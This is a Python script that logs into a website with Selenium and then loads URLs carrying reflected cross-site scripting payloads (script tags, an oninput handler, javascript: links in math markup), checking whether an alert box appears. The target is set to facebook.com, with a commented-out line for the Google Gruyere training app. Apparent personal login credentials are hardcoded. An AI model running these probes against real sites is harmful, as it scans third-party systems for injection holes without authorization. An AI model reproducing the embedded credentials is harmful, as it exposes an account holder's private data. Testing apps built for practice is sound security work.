import requests
from bs4 import BeautifulSoup
# import mechanize
# import urllib.request  as urllib2 
# import re
# import html
import time

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException

# base_url = "https://google-gruyere.appspot.com/618655413586375839657115594994104056558"
base_url = "https://www.facebook.com"
#------------------------------------#
# reg_url = "http://google-gruyere.appspot.com/start"
#------------------------------------#
#info to create a new users
user = "smith.jhsn@gmail.com"
password = "smith2013"
#------------------------------------#
#user login page with passed info
url_login = base_url + "/login"

#add a session to the request
s = requests.session()
#create a header to add it to the request
headers = {
	'user-agent' : 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0'
}


request = s.get(url_login)

#parse HTML page
parseHTML = BeautifulSoup(request.text, 'html.parser')

#Extract the form name using Beautifull Soap
htmlForm = parseHTML.form
# print(parseHTML)

inputs = htmlForm.find_all('input', type=["text", "password"])
	
#Extract Input Field Names
inputFieldNames = []

for items in inputs:
	if items.has_attr('name'):
		inputFieldNames.append(items['name'])


time.sleep(5)


browser = webdriver.Firefox()
browser.get(url_login) 


#Extract Input Field Labels
inputFieldLabels = []


for i in range(len(inputFieldNames)):
	input_tag = str(inputs[i].parent.previous_sibling).replace(":", "").replace('\n','')
	input_label_text = BeautifulSoup(input_tag, 'html.parser').get_text()
	inputFieldLabels.append(input_label_text)



for i in range(len(inputFieldLabels)):
	if "user" in inputFieldNames[i] or "user" in inputFieldLabels[i] or "email" in inputFieldNames[i] or "email" in inputFieldLabels[i]:
		browser.find_element_by_name(inputFieldNames[i]).send_keys(user)
		# print(user)
	if "pass" in inputFieldNames[i] or "pass" in inputFieldLabels[i]:
		browser.find_element_by_name(inputFieldNames[i]).send_keys(password)
		# print(password)
	
# print(inputFieldNames)



time.sleep(10)

login_attempt = browser.find_element_by_xpath("""//input[@type='submit' or @value='1']""")
login_attempt.submit()

time.sleep(10)

current_url = browser.current_url
newurl = base_url+"/"+"""<ScRipT>alert("XSS");</ScRipT>""";
browser.get(newurl);
try:
    WebDriverWait(browser, 3).until(EC.alert_is_present(),
                                   'Timed out waiting for PA creation ' +
                                   'confirmation popup to appear.')

    alert = browser.switch_to.alert
    alert.accept()
    print("alert accepted")
except TimeoutException:
    print("no alert")

time.sleep(3)

newurl = base_url+"/"+"""<body oninput=javascript:alert(1)><input autofocus>""";
browser.get(newurl);
try:
    WebDriverWait(browser, 3).until(EC.alert_is_present(),
                                   'Timed out waiting for PA creation ' +
                                   'confirmation popup to appear.')

    alert = browser.switch_to.alert
    alert.accept()
    print("alert accepted")
except TimeoutException:
    print("no alert")

time.sleep(3)

newurl = base_url+"/"+"""<math href="javascript:javascript:alert(1)">CLICKME</math> <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:alert(1)">CLICKME</maction> </math>""";
browser.get(newurl);
try:
    WebDriverWait(browser, 3).until(EC.alert_is_present(),
                                   'Timed out waiting for PA creation ' +
                                   'confirmation popup to appear.')

    alert = browser.switch_to.alert
    alert.accept()
    print("alert accepted")
except TimeoutException:
    print("no alert")

time.sleep(3)

# newsnippet_url = base_url + "/newsnippet.gtl"

# new_snippet = browser.find_element_by_xpath("""/html/body/div[2]/div/form/textarea""")

# new_snippet.send_keys("<script>alert</script>")